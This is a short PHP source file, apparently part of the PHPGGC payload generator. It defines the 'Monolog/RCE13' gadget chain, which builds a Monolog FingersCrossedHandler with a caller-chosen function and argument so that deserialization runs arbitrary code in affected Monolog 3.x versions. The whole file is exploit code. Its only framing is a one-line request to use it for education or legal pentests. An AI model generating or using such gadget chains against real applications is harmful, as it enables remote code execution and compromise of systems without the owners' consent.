<?php

namespace GadgetChain\Monolog;

class RCE13 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.0.0 <= 3.12.0+';
    public static $vector = '__destruct';
    public static $author = 'mir-hossein (Mirhossein Rahmani)';
    public static $information = 'This GC is the same as my previous GC (Monolog/RCE9) + PHP-IAA-RDV trick. Please use it only for educational purposes or legal pentest.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Monolog\Handler\FingersCrossedHandler($function, $parameter);
    }
}